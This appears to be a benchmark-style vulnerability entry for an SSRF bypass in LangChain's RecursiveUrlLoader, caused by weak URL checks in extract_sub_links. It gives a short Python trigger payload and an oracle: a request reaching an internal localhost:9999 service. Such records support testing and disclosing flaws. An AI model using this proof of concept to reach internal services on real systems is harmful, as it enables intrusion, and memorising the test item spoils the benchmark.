title: SSRF bypass in RecursiveUrlLoader due to improper URL validation in extract_sub_links function
trigger_payload:
from langchain_community.document_loaders.recursive_url_loader import (RecursiveUrlLoader,)
from bs4 import BeautifulSoup as Soup
loader = RecursiveUrlLoader(
    "http://localhost",
    max_depth=2,
    extractor=lambda x: Soup(x, "html.parser").text,
)
data = loader.load()
oracle: A request is sent to the internal service http://localhost:9999/ssrf, which can be observed on the server listening on port 9999.
